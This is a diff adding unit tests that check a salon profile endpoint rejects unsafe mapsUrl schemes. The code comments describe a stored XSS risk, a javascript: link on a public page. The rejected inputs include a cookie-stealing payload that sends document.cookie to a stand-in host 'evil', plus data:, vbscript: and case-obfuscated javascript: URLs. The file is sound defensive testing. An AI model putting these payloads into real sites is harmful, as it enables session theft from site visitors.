@@ -91,6 +91,41 @@ describe("salon.updateSalonProfile — URL hardening (security)", () => {
     });
   });
 
+  describe("mapsUrl", () => {
+    // mapsUrl is rendered into `<a href={profile.mapsUrl}>` ("Открыть на карте")
+    // on the PUBLIC /salon/<slug> page, which ships the looser
+    // `script-src 'unsafe-inline'` CSP branch — so a `javascript:` href EXECUTES
+    // on click. Same sink class as instagramUrl, but mapsUrl was left as a bare
+    // `z.string().max(2048)` with no scheme guard (SEC-001). https-only, since a
+    // maps link can point at any provider (Google, goo.gl, Yandex, 2GIS).
+    it.each([
+      "javascript:fetch('//evil/'+document.cookie)",
+      "data:text/html,<script>alert(1)</script>",
+      "JaVaScRiPt:alert(1)",                       // case-obfuscated
+      "vbscript:msgbox(1)",
+      "http://maps.google.com/?q=salon",           // bare http
+      " https://maps.google.com/?q=salon",         // leading whitespace
+    ])("rejects %j", async (badUrl) => {
+      const { caller } = makeCallerForTenant();
+      await expect(
+        caller.updateSalonProfile({ tenantId: "t_owner", mapsUrl: badUrl } as never),
+      ).rejects.toMatchObject({ code: "BAD_REQUEST" });
+    });
+
+    it.each([
+      "https://maps.google.com/?q=My+Salon",
+      "https://maps.app.goo.gl/abc123",
+      "https://yandex.ru/maps/-/CCabcd",
+      "",                          // clearing the field
+    ])("accepts %j", async (goodUrl) => {
+      const { caller, updateCalls } = makeCallerForTenant();
+      await expect(
+        caller.updateSalonProfile({ tenantId: "t_owner", mapsUrl: goodUrl } as never),
+      ).resolves.toBeTruthy();
+      expect(updateCalls.length).toBeGreaterThan(0);
+    });
+  });
+
   describe("logo / coverPhoto", () => {
     it.each([
       ["logo", "javascript:alert(1)"],
